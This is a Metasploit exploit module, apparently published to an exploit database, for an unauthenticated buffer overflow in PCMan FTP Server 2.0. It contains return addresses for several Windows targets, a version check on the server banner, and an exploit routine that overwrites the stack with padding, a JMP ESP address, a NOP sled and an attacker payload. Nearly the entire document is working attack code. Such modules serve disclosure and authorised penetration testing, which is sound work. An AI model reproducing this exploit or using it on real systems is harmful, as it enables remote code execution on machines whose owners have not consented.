# Exploit Title: PCMan FTP Server 2.0 Buffer Overflow
# Google Dork: n/a
# Date: 01/04/2017
# Exploit Author: Chris Easton, Student @ Leeds Beckett University
# Vendor Homepage: Unavailable! 
# Software Link: Unavailable / Exploit DB: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.x
# Tested on: Windows XP SP3 x86, Windows 7 SP1 x86, Windows 7 SP1 x64.
# CVE : n/a

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  def initialize(info = {})

  super(update_info(info,
    'Name' => 'PCMan FTP Server 2.0 Buffer Overflow',
    'Description' => %q{Module to exploit PCMan 2 FTP Server on xp/vista/7. Exploits generic buffer overflow in PC Man's FTP Server unauthenticated.
	 Tested on Windows XP SP3 x86, Windows 7 SP1 x64 and Windows 7 SP1 x86. Greetings to corelanc0d3r,  },
    'Author' => [ 'Chris E <eastonch@gmail.com>'],
    'References' => 
	[
	  [ 'EDB', '31789']
	],
    'Version' => '$Revision: 1 $',
    'Platform' => ['win'],
    'Targets' => 
	[ 
		[ 'Windows 7 Professional x86 SP1', 
			{
				'Ret' => 0x73825a9f, 
			} 
		],
		[ 'Windows XP x86 Sp3', 
			{
				'Ret' => 0x7cb41020, 
			} 
		],
		[ 'Windows 7 Professional x64 SP1',
			{
				'Ret' => 0x73825a9f,
			}
		]
	],
    'DefaultTarget' => 0,
    'Payload' => {'BadChars' => "\x00\x0a\x0d\x20"},
    'DefaultOptions' => {'EXITFUNC' => 'process'}
  ))
  end
# Targets - Return address changes between XP and 7, both found in SHELL32.dll 
# x86 and x64 Windows 7 systems use the same return address,
# both were included for correct automatic targetting


# Check Function, Connects to the Target and confirms that the Banner responds as Version 2.0
#TODO add tolerance for custom banners

  def check
	connect
	banner = banner = sock.get_once
	disconnect
	
	if (banner =~ /220 PCMan\'s FTP Server 2\.0 Ready\./)
		return Exploit::CheckCode::Vulnerable
	end
		return Exploit::CheckCode::Safe
  end

# Exploit Function
# Connect to FTP server, send 2009 A's + return address of FF E4 JMP ESP + 25 NOPS + payload + 10 C's as extraroom)
  def exploit
    puts "[~] PCMan2 FTP Server Buffer Overflow Exploit"
    bad = "A" * 2009 + [target.ret].pack('V') + "\x90" * 25  + payload.encoded + "C" * 10
    connect
      puts "[+] Connected! Sending Payload..."
      sock.put(bad) 
      puts "[+] Payload Sent!"
      sock.get_once(timeout = 5)
    disconnect # Payload is sent, disconnect this session.
  end
end
